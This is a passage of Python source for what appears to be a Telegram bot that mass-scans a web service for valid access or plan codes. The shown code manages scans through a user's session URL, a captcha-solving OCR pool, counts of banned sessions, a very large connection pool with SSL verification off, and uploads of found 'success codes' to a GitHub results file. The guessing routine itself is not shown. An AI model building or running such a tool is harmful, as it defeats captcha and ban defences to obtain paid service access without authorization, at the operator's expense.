        await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ" if p else "Command ထပ်ပေးပို့ပါ",
                                    cid, call.message.message_id)
        if p: await _launch(cid, p["mode"], p["lengths"], p["target"], call.message, p.get("plan_filters",[]))

@bot.message_handler(commands=["saved"])
async def cmd_saved(m):
    cid = m.chat.id
    succ = success_texts.get(cid, []); lim = limited_texts.get(cid, [])
    if not succ and not lim:
        await bot.reply_to(m, "ရှာတွေ့ထားသော code မရှိသေးပါ"); return
    parts = []
    if succ:
        parts.append(f"✅ **Success Codes** ({len(succ)})")
        parts += [f"`{i['code']}` – ⏳ {i.get('plan','N/A')}" for i in succ]
    if lim:
        parts.append(f"\n⚠️ **Limited Codes** ({len(lim)})")
        parts += lim
    await send_chunks(cid, "\n".join(parts), parse_mode="Markdown", reply_to=m.message_id)

@bot.message_handler(commands=["delete_saved"])
async def cmd_delete_saved(m):
    cid = m.chat.id
    sc = len(success_texts.get(cid, [])); lc = len(limited_texts.get(cid, []))
    for d in (success_texts, limited_texts, notify_state, success_messages, limited_messages):
        d.pop(cid, None)
    try:
        results, sha = await get_file_content("result.json")
        if str(cid) in results:
            del results[str(cid)]
            await update_file_retry("result.json", results, sha, f"Delete {cid}")
    except Exception as e:
        await bot.reply_to(m, f"⚠️ Local ဖျက်ပြီး၊ GitHub error: `{e}`", parse_mode="Markdown"); return
    await bot.reply_to(m, f"🗑️ ဖျက်ပြီး\n  • Success: {sc}\n  • Limited: {lc}")

@bot.message_handler(commands=["notify"])
async def cmd_notify(m):
    cid = m.chat.id
    notify_setting[cid] = not notify_setting.get(cid, False)
    await bot.reply_to(m, f"Notify: {'ON' if notify_setting[cid] else 'OFF'}")

@bot.message_handler(commands=["recheck"])
async def cmd_recheck(m):
    cid = m.chat.id
    if cid not in user_data or "session_url" not in user_data[cid]:
        await bot.reply_to(m, "/setup ဖြင့် Session URL ထည့်ပါ"); return
    succ = success_texts.get(cid, [])
    if not succ:
        await bot.reply_to(m, "Recheck လုပ်ရန် success code မရှိပါ"); return
    await bot.reply_to(m, "Success codes ပြန်စစ်ဆေးနေပါသည်...")
    new_succ = []
    for item in succ:
        r = await perform_check(user_data[cid]["session_url"], item["code"],
                                cid, recheck=True, message=m)
        if r: new_succ.append(item)
    success_texts[cid] = new_succ
    if new_succ:
        await bot.reply_to(m, "✅ Rechecked:\n" + "\n".join(i["code"] for i in new_succ))
    else:
        await bot.reply_to(m, "Recheck ပြီး — success code မကျန်ပါ")

@bot.message_handler(commands=["status"])
async def cmd_status(m):
    if str(m.chat.id) != ADMIN_ID:
        await bot.reply_to(m, "No Permission"); return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up = int(time.monotonic()-_start_time); h,r = divmod(up,3600); mn,s = divmod(r,60)
    pool = _captcha_pool.qsize() if _captcha_pool else 0
    await bot.reply_to(
        m,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {h}h {mn}m {s}s\n"
        f"🔍 Active Scans: {active}\n"
        f"🎯 Captcha Pool: {pool}\n"
        f"🚫 Banned: {len(_banned_sessions)}\n"
        f"👥 Sessions: {len(user_data)}\n"
        f"⚡ uvloop: {'ON' if _UV else 'off'}"
    )

# ─────────────────────────────────────────────────────────────────────────
# GitHub result scheduler
# ─────────────────────────────────────────────────────────────────────────
async def github_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if not items: continue
        try:
            results, sha = await get_file_content("result.json")
            for it in items:
                uid = str(it["chat_id"]); code = it["code"]
                sid = it.get("session_id",""); plan = it.get("plan","N/A")
                results.setdefault(uid, [])
                existing = [e["code"] if isinstance(e,dict) else e for e in results[uid]]
                if code not in existing:
                    results[uid].append({"code":code,"session_id":sid,"plan":plan})
            await update_file_retry("result.json", results, sha, "Periodic Update")
        except Exception as e:
            log.error(f"github_scheduler: {e}")
            for it in items: await SUCCESS_CODE.put(it)

# ─────────────────────────────────────────────────────────────────────────
# Load saved results from GitHub on startup
# ─────────────────────────────────────────────────────────────────────────
async def load_saved_results():
    try:
        results, _ = await get_file_content("result.json")
        for cid_str, entries in results.items():
            try: cid = int(cid_str)
            except ValueError: continue
            success_texts.setdefault(cid, [])
            for e in entries:
                if isinstance(e, dict):
                    code, sid, plan = e.get("code",""), e.get("session_id",""), e.get("plan","N/A")
                else:
                    code, sid, plan = str(e), "", "N/A"
                if not any(x["code"]==code for x in success_texts[cid]):
                    success_texts[cid].append({"code":code,"session_id":sid,"plan":plan})
        total = sum(len(v) for v in success_texts.values())
        log.info(f"Loaded {total} saved codes from GitHub")
    except Exception as e:
        log.warning(f"load_saved_results: {e}")

# ─────────────────────────────────────────────────────────────────────────
# Polling
# ─────────────────────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=45, request_timeout=55, interval=0)
            return
        except Exception as e:
            log.error(f"Polling: {e}. Retry {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff*2, 60)

# ─────────────────────────────────────────────────────────────────────────
# Graceful SIGTERM
# ─────────────────────────────────────────────────────────────────────────
async def _shutdown():
    log.info("SIGTERM")
    if _filler_task and not _filler_task.done(): _filler_task.cancel()
    await asyncio.sleep(1)
    if session:      await session.close()
    if _connector:   await _connector.close()
    if _ocr_executor: _ocr_executor.shutdown(wait=False)
    asyncio.get_event_loop().stop()

# ─────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────
async def main():
    global session, _connector, _ocr_executor

    _ocr_executor = ThreadPoolExecutor(max_workers=OCR_WORKERS, thread_name_prefix="ocr")
    _connector    = aiohttp.TCPConnector(
        limit=5000, limit_per_host=2000,
        ttl_dns_cache=300, ssl=False, keepalive_timeout=60,
    )
    session = aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        timeout=aiohttp.ClientTimeout(total=30),
    )
    try:
        loop = asyncio.get_event_loop()
        loop.add_signal_handler(signal.SIGTERM, lambda: asyncio.create_task(_shutdown()))
    except NotImplementedError: pass

    asyncio.create_task(web_server())
    asyncio.create_task(github_scheduler())
    await load_saved_results()

    log.info(f"Starting | uvloop={_UV} | webhook={'ON: '+WEBHOOK_URL if WEBHOOK_URL else 'polling'}")

    if WEBHOOK_URL:
        await bot.remove_webhook()
        await asyncio.sleep(1)
        await bot.set_webhook(WEBHOOK_URL, drop_pending_updates=True)
        log.info(f"Webhook: {WEBHOOK_URL}")
        await asyncio.Event().wait()
    else:
        await start_polling()

if __name__ == "__main__":
    asyncio.run(main())
